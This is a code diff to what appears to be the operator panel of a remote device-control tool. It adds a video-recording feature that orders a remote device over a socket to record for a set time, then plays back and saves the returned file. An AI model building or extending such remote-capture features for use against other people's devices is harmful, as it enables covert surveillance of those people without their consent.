@@ -65,7 +65,11 @@ app.config(function ($routeProvider) {
         .when("/geofencing", {
             templateUrl: "./views/geofencing.html",
             controller: "GeoCtrl"
-    });
+        })
+        .when("/videoRecording", {
+            templateUrl: "./views/videoRecording.html",
+            controller: "VidCtrl"
+        });
 });
 
 
@@ -167,6 +171,67 @@ app.controller("GeoCtrl", function ($scope, $rootScope) {
             $rootScope.Log('Geofence failed: ' + data.error, CONSTANTS.logStatus.FAIL);
             $GeoCtrl.result = { success: false, msg: 'Error: ' + data.error };
             $GeoCtrl.$apply();
+        }
+    });
+});
+
+
+//-----------------------Video Recording Controller (videoRecording.htm)------------------------
+app.controller("VidCtrl", function ($scope, $rootScope) {
+    $VidCtrl = $scope;
+    var videoRecording = CONSTANTS.orders.videoRecording;
+
+    $VidCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(videoRecording);
+    });
+
+    $VidCtrl.isVideo = false;
+
+    $VidCtrl.Record = (seconds) => {
+        if (seconds) {
+            if (seconds > 0) {
+                $VidCtrl.load = 'loading';
+                $rootScope.Log('Recording video ' + seconds + "'s...");
+                socket.emit(ORDER, { order: videoRecording, sec: seconds });
+            } else
+                $rootScope.Log('Seconds must be more than 0');
+        }
+    }
+
+    socket.on(videoRecording, (data) => {
+        if (data.file == true) {
+            $VidCtrl.load = '';
+            $rootScope.Log('Video arrived', CONSTANTS.logStatus.SUCCESS);
+
+            var player = document.getElementById('videoPlayer');
+            var source = document.getElementById('videoSource');
+            var uint8Arr = new Uint8Array(data.buffer);
+            var binary = '';
+            for (var i = 0; i < uint8Arr.length; i++) {
+                binary += String.fromCharCode(uint8Arr[i]);
+            }
+            var base64String = window.btoa(binary);
+
+            $VidCtrl.isVideo = true;
+            $VidCtrl.$apply();
+            source.src = "data:video/mp4;base64," + base64String;
+            player.load();
+            player.play();
+
+            $VidCtrl.SaveVideo = () => {
+                $rootScope.Log('Saving video..');
+                var filePath = path.join(downloadsPath, data.name);
+                fs.outputFile(filePath, data.buffer, (err) => {
+                    if (err)
+                        $rootScope.Log('Saving video failed', CONSTANTS.logStatus.FAIL);
+                    else
+                        $rootScope.Log('Video saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                });
+            };
+        } else if (data.error) {
+            $VidCtrl.load = '';
+            $rootScope.Log('Video recording failed', CONSTANTS.logStatus.FAIL);
+            $VidCtrl.$apply();
         }
     });
 });
